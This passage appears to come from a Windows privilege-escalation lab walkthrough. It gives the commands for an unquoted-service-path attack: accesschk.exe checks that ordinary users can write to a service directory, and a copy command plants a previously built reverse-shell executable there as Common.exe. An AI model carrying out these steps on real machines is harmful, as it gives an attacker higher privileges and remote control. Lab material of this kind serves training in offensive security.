```

Using accesschk.exe, note that the BUILTIN\Users group is allowed to write to the C:\Program Files\Unquoted Path Service\ directory:  

```
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```

Copy the reverse.exe executable you created to this directory and rename it Common.exe:

```
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

```
